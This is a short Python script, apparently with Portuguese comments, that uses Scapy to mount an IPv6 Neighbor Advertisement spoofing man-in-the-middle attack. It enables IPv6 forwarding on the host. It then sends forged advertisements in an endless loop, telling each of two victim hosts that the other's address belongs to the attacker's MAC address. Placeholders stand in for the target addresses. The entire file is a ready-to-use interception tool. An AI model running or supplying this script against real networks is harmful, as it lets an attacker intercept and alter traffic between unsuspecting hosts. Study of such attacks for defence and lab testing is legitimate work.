from scapy.all import *
import time
import os

def mitm(ip_vitima01, ip_vitima02, mac_atacante):

	print '[+] IPv6 Neighbor Advertisement Spoofing'        

	os.system('echo 1 > /proc/sys/net/ipv6/conf/all/forwarding')	

        ip01 = IPv6(src = ip_vitima01, dst = ip_vitima02)            	# Pacote IPv6
        nd01 = ICMPv6ND_NA(tgt = ip_vitima01, R = 0)              	# Pacote IMPCv6 (Neighbor Advertisement)
        lla01 = ICMPv6NDOptDstLLAddr(lladdr = mac_atacante)       	# Opcao Destination Link Layer Address
        pkt01 = ip01 / nd01 / lla01                               	# Pacote Final

       	ip02 = IPv6(src = ip_vitima02, dst = ip_vitima01)               # Pacote IPv6
        nd02 = ICMPv6ND_NA(tgt = ip_vitima02, R = 0)                    # Pacote IMPCv6 (Neighbor Advertisement)
        lla02 = ICMPv6NDOptDstLLAddr(lladdr = mac_atacante)             # Opcao Destination Link Layer Address
	pkt02 = ip02 / nd02 / lla02
	
	while True:

	        send(pkt01, iface = 'eth0')        	# Enviando Pacote 01
		send(pkt02, iface = 'eth0')		# Enviando Pacote 02
		time.sleep(5)			  	# Zzzz...        
        
################################################################################################################

ipv6_vitima01 = "IPv6 VITIMA 01"
ipv6_vitima02 = "IPv6 VITIMA 02"
mac_atacante = "MAC Address do Atacante"

mitm(ipv6_vitima01, ipv6_vitima02, mac_atacante)
